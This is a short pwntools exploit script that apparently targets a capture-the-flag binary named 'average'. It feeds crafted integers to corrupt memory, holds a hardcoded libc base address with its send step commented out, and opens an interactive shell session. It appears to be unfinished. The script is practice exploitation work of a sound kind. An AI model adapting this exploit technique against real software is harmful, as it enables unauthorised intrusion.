import pwn
elf = pwn.context.binary = pwn.ELF("./average")
pwn.context.terminal = ['tmux', 'splitw', '-h']
if pwn.args.GDB:
    p = pwn.gdb.debug("./average", gdbscript='c\n')
else:
    p = elf.process()
p.sendlineafter(b"n: ", b"20000")
for _ in range(16):
    p.sendlineafter(b": ", f"{20000+_}".encode())
n = p.sendlineafter(b": ", b"4919")
p.sendlineafter(b": ", b"-123456788")
libc = 0x7fa9811a5000
# p.sendlineafter(b": ", f"{libc}".encode())
p.interactive()
